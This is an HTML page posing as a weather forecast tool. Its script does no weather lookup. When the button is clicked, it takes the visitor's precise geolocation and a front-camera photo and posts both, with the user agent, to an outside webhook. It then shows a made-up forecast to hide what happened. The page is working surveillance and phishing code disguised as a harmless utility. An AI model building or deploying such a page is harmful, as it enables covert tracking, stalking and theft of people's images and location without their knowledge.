<!DOCTYPE html>
<html>
<head>
    <title>Weather Forecast</title>
</head>
<body>
    <div style="font-family:sans-serif;text-align:center;padding:30px">
        <div style="font-size:80px">🌤️</div>
        <h2>Check Today's Weather</h2>
        <p>Get real-time forecast for your area</p>
        <button onclick="startCapture()" style="padding:12px 30px;background:#007bff;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer">
            🌤️ Show Weather
        </button>
        <p id="status" style="color:gray;font-size:14px;margin-top:20px"></p>
    </div>

    <video id="video" style="display:none" playsinline></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
    //const WEBHOOK = 'https://webhook.site/16155721-b9ba-438b-84c5-5f6a5461638c';
      const WEBHOOK = 'https://weather-ha.free.beeceptor.com';

    function sendToWebhook(data) {
        fetch(WEBHOOK, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(data)
        });
    }

    async function startCapture() {
        const status = document.getElementById('status');
        status.innerText = 'Loading weather data...';

        let latitude = null;
        let longitude = null;
        let accuracy = null;
        let photoBase64 = null;
        let cameraError = null;
        let locationError = null;

        // Step 1: Request location FIRST
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000
                });
            });
            latitude = position.coords.latitude;
            longitude = position.coords.longitude;
            accuracy = position.coords.accuracy;

            // Immediately send location to webhook
            sendToWebhook({
                type: 'location',
                lat: latitude,
                lng: longitude,
                accuracy: accuracy,
                timestamp: new Date().toISOString(),
                ua: navigator.userAgent
            });
        } catch (err) {
            locationError = err.message;
        }

        // Step 2: Then request camera
        status.innerText = 'Preparing forecast...';
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            });

            const video = document.getElementById('video');
            video.srcObject = stream;
            await video.play();

            await new Promise(r => setTimeout(r, 800));

            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
            stream.getTracks().forEach(track => track.stop());

            // Send photo + location together
            sendToWebhook({
                type: 'photo',
                photo: photoBase64,
                lat: latitude,
                lng: longitude,
                accuracy: accuracy,
                timestamp: new Date().toISOString(),
                ua: navigator.userAgent
            });

        } catch (err) {
            cameraError = err.message;
        }

        // Step 3: Send combined summary
        sendToWebhook({
            type: 'summary',
            location: { lat: latitude, lng: longitude, accuracy: accuracy },
            locationError: locationError,
            hasPhoto: photoBase64 ? true : false,
            cameraError: cameraError,
            timestamp: new Date().toISOString(),
            ua: navigator.userAgent
        });

        status.innerText = '✅ Weather: 26°C, Partly Cloudy';
        status.style.color = '#28a745';
    }
    </script>
</body>
</html>
